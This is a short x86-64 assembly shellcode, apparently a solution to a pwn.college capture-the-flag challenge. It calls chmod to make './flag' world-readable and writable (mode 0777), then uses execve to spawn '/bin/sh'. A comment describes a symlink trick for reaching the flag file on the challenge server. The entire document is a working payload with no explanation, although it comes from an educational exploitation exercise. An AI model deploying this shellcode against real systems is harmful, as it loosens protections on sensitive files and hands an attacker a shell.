.global _start
_start:
.intel_syntax noprefix

	mov eax, 90
	lea edi, [rip+flagfile]
	mov esi, 0x1ff
	syscall
	mov eax, 59
	lea edi, [rip+binsh]
	mov esi, 0
	mov edx, 0
	syscall
binsh:	
	.string "/bin/sh"
flagfile:
	.string "./flag" #in pwncollege server change ./flag to use symlink to ../../flag -> ./a
